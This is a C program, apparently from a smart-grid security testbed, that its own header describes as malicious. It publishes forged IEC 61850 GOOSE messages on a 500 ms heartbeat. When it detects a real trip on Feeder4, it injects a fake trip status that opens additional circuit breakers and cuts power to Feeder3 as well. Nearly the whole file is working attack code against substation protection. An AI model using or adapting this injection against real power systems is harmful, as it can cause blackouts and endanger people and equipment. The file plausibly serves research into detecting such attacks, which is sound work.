/*
 * goose_publisher_PIOC_8531d
 
#####################################################################################################################################################

Malicious behaviour:

Network level: Except the benign behaviours, this malicious program will be also running and publishing GOOSE packets (500ms heartbeat) mal_Pub_FDR (0100010: open CB2_22KV, CB_FDR3) to physcial process (Simulink) when a short-circuit happens around Feeder4.

Physical process level:If a short circuit happens around Feeder4, (CB_FDR3, CB_FDR4) will be opened. Both Feeder3 and Feeder4 are no longer supplied with any power load.

#####################################################################################################################################################
*/


#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//#######Define the attack settings #########//

//The number of packets in one period
#define No_pkts all 
//The Heartbeat of injecting packets (milliseconds)
#define HB 500 

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int CBstval[7] = {0,1,0,0,0,0,0}; //current CBstval
    int PreCBstval[7] = {0,1,0,0,0,0,0}; //previous CBstval
    int FakeTrip[7] = {0,1,0,0,0,1,1}; // Fake trip CBstval
    int idx_TrueTrip = 7;
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3103;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x03;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	* Create a new GOOSE publisher instance. As the second parameter the interface
	* name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	* is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	* stack_config.h is used.
	*/ 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "QUTZS_FDRPIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_FDRPIOC/LLN0$DS_FDR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);

	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create(); 	
	    	FILE *fp;
	    	int i;
	    	
	    	fp=fopen("/home/ray/Desktop/FDR OverCur Prot/TripRecord/TripFromPLC.csv","r");
			for (i=0; i<7; i++) {
		    	fscanf(fp,"%d,", &CBstval[i]);
			}    
	    	fclose(fp);
			
			if (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) {  // Compare the previous values
				GoosePublisher_increaseStNum(publisher); //if CB status changes (current != previous), stNum+1
				memcpy(PreCBstval,CBstval,sizeof(CBstval));
			}    
	    
			if (CBstval[idx_TrueTrip-1] != 0) {	// If an actual trip occurs
				for (i = 0; i <7; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(FakeTrip[i]));
					LinkedList_add(dataSetValues, quality); 
				}
				GoosePublisher_publish(publisher, dataSetValues);
				Thread_sleep(HB);
			}
			else 
				Thread_sleep(50);		
		    
			LinkedList_destroyStatic(dataSetValues);
		}
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    	
}
